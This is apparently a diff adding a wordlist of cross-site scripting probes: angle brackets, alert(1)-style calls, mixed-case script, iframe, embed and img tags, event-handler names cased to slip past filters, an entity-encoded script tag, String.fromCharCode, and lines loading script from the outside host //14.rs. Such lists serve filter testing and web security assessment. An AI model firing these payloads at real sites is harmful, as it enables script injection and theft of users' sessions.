@@ -1,0 +1,60 @@
+<
+>
+<test>
+(test)
+"test"
+'test'
+`test`
+alert(1)
+prompt(1)
+confirm(1)
+(alert)(1)
+<sCript x></sCript x>
+<scriPt>
+//14.rs
+javascript:
+oNActivate
+oNBefOreACtivate
+onBegin
+onBlur
+oNClicK
+oNCoPy
+oNCUt
+onDrag
+onDrop
+oNEnd
+onError
+oNFocus
+onInput
+oNlOAd
+oNMouseOver
+onMouseUp
+onPaste
+onResize
+onResizeEnd
+onResizeStart
+onScroll
+oNSubmit
+onWheel
+oNPlay
+oNWheel
+oNSuspend
+oNLoADMEtADaTA
+oNLOaDStart
+<obJect daTa=y>
+<isindex mouseover=y>
+<eMbEd src=y>
+String.fromCharCode(88,83,83)
+<b oNcLick=y>
+<IfRame src=y>
+<sCriPt sRc=y>
+&#x3C;script&#x3E;
+<iMg srC=y>
+<MaRquEE oNStArt=y>
+<r sRc=x oNError=r>
+<z sRc=//14.rs>
+<q oNxX=q>
+<b><br>
+<body>
+<!--
+-->
